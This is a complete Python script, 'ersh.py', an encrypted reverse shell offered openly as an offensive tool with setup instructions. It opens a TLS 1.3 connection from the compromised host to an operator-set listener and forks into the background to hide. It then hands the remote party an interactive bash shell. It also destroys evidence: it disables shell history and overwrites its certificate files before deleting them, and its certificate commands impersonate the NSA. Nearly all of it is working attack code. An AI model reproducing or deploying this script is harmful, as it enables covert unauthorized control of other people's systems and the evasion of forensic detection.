#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    ersh.py - Encrypted Reverse Shell

    Original: @JusticeRage
    Python3 port: @icewzl
    Updated: @moscovium-mc

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    ---------------------------------------------------------------------------
    Reverse listener command (run on your machine):
      socat openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt,openssl-min-proto-version=TLS1.3 file:`tty`,raw,echo=0

    Generate certs (run once, on your machine):
      openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\
          -subj "/C=US/ST=Maryland/L=Fort Meade/O=NSA/CN=www.nsa.gov" \\
          -keyout server.key -out server.crt && \\
          cat server.key server.crt > server.pem && \\
          openssl dhparam 2048 >> server.pem
      openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\
          -subj "/C=US/ST=Maryland/L=Fort Meade/O=NSA/CN=www.nsa.gov" \\
          -keyout client.key -out client.crt
    ---------------------------------------------------------------------------
"""

###############################################################################
# EDIT THE PARAMETERS BELOW THIS LINE
###############################################################################

HOST  = ""           # Listener IP or hostname
PORT  = 443          # Listener port
SHELL = ["/bin/bash", "--noprofile", "--norc"]

# Unset everything that could leave a trace – belt and suspenders.
FIRST_COMMAND = (
    "unset HISTFILE HISTSIZE HISTFILESIZE HISTTIMEFORMAT PROMPT_COMMAND; "
    "export HISTFILE=/dev/null"
)

# Paste the FULL contents of client.key here
client_key = """\
-----BEGIN PRIVATE KEY-----
[Edit me!]
-----END PRIVATE KEY-----
"""

# Paste the FULL contents of client.crt here
client_crt = """\
-----BEGIN CERTIFICATE-----
[Edit me!]
-----END CERTIFICATE-----
"""

# Paste the FULL contents of server.crt here (NOT server.pem – just the cert)
server_crt = """\
-----BEGIN CERTIFICATE-----
[Edit me!]
-----END CERTIFICATE-----
"""

###############################################################################
# EDIT THE PARAMETERS ABOVE THIS LINE
###############################################################################

import os
import pty
import select
import socket
import ssl
import subprocess
import sys
import tempfile
import time

# ---------------------------------------------------------------------------
# Colour helpers
# ---------------------------------------------------------------------------

GREEN = "\033[92m"
RED   = "\033[91m"
END   = "\033[0m"

def red(t):     return RED   + t + END
def green(t):   return GREEN + t + END
def error(t):   return f"[{red('!')}] {red('Error: ' + t)}"
def success(t): return f"[{green('*')}] {green(t)}"

# ---------------------------------------------------------------------------
# Utility: find a writable tmpfs mount (avoids disk writes where possible)
# ---------------------------------------------------------------------------

def get_safe_mountpoint() -> str:
    """Return a writable tmpfs mountpoint, or fall back to /tmp."""
    try:
        p = subprocess.run(
            ["mount", "-t", "tmpfs"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        for line in p.stdout.splitlines():
            if "rw" not in line:
                continue
            parts = line.split()
            if len(parts) < 3:
                continue
            mountpoint = parts[2]
            if not mountpoint.startswith("/"):
                continue
            if not os.access(mountpoint, os.W_OK):
                continue
            try:
                st = os.statvfs(mountpoint)
                if st.f_bfree >= 1000:
                    return mountpoint
            except OSError:
                continue
    except Exception:
        pass
    return tempfile.gettempdir()

# ---------------------------------------------------------------------------
# SSL connection (modern SSLContext, not the deprecated wrap_socket)
# ---------------------------------------------------------------------------

def establish_connection() -> "ssl.SSLSocket | None":
    """
    Write certs to a tmpfs-backed NamedTemporaryFile, establish a mutually-
    authenticated TLS 1.3 connection, then shred the temp files immediately.
    """
    tmpdir = get_safe_mountpoint()

    kw = dict(dir=tmpdir, delete=False, suffix=".tmp")
    f_ckey = tempfile.NamedTemporaryFile(**kw)
    f_ccrt = tempfile.NamedTemporaryFile(**kw)
    f_scrt = tempfile.NamedTemporaryFile(**kw)

    try:
        f_ckey.write(client_key.encode()); f_ckey.flush(); f_ckey.close()
        f_ccrt.write(client_crt.encode()); f_ccrt.flush(); f_ccrt.close()
        f_scrt.write(server_crt.encode()); f_scrt.flush(); f_scrt.close()

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.check_hostname  = False    # cert pinned via cafile, hostname irrelevant
        ctx.verify_mode     = ssl.CERT_REQUIRED
        ctx.load_verify_locations(cafile=f_scrt.name)
        ctx.load_cert_chain(certfile=f_ccrt.name, keyfile=f_ckey.name)

        raw = socket.create_connection((HOST, PORT), timeout=15)
        sock = ctx.wrap_socket(raw, server_hostname=HOST)
        return sock

    except ssl.SSLError as exc:
        print(error(f"TLS handshake failed: {exc}"))
        return None
    except OSError as exc:
        print(error(f"Could not connect to {HOST}:{PORT} – {exc}"))
        return None
    finally:
        # Scrub cert files from disk immediately
        for fpath in (f_ckey.name, f_ccrt.name, f_scrt.name):
            try:
                size = os.path.getsize(fpath)
                with open(fpath, "wb") as fh:
                    fh.write(os.urandom(size))
                os.unlink(fpath)
            except OSError:
                pass

# ---------------------------------------------------------------------------
# Daemonize (double-fork)
# ---------------------------------------------------------------------------

def daemonize() -> None:
    def _fork() -> None:
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as exc:
            print(error(f"fork failed: {exc}"))
            sys.exit(1)

    _fork()
    os.setsid()
    os.umask(0)
    _fork()

    # Redirect stdio to /dev/null so the daemon doesn't hold the terminal
    devnull = os.open("/dev/null", os.O_RDWR)
    os.dup2(devnull, sys.stdin.fileno())
    os.dup2(devnull, sys.stdout.fileno())
    os.dup2(devnull, sys.stderr.fileno())
    os.close(devnull)

# ---------------------------------------------------------------------------
# Main relay loop
# ---------------------------------------------------------------------------

def relay(sock: ssl.SSLSocket) -> None:
    """Splice the SSL socket ↔ the PTY master."""
    master, slave = pty.openpty()

    shell = subprocess.Popen(
        SHELL,
        preexec_fn=os.setsid,
        stdin=slave,
        stdout=slave,
        stderr=slave,
        close_fds=True,
    )
    os.close(slave)

    # Send the initial anti-forensics command
    time.sleep(0.8)
    os.write(master, f"{FIRST_COMMAND}\n".encode())

    try:
        while shell.poll() is None:
            try:
                rlist, _, _ = select.select([sock, master], [], [], 0.5)
            except (ValueError, OSError):
                break

            if sock in rlist:
                # SSLSocket may have buffered data; drain it all.
                try:
                    data = sock.recv(4096)
                except ssl.SSLWantReadError:
                    continue
                except (ssl.SSLError, OSError):
                    break
                if not data:
                    break
                while sock.pending():
                    try:
                        data += sock.recv(4096)
                    except (ssl.SSLError, OSError):
                        break
                try:
                    os.write(master, data)
                except OSError:
                    break

            if master in rlist:
                try:
                    chunk = os.read(master, 4096)
                except OSError:
                    break
                try:
                    sock.sendall(chunk)
                except (ssl.SSLError, OSError):
                    break
    finally:
        try:
            os.close(master)
        except OSError:
            pass
        try:
            shell.terminate()
        except OSError:
            pass
        sock.close()


def main() -> int:
    if not HOST:
        print(error("HOST is not set. Edit the configuration section at the top of this script."))
        return 1

    sock = establish_connection()
    if sock is None:
        return 1

    print(success("Connection established!"))
    daemonize()
    relay(sock)
    return 0


if __name__ == "__main__":
    sys.exit(main())
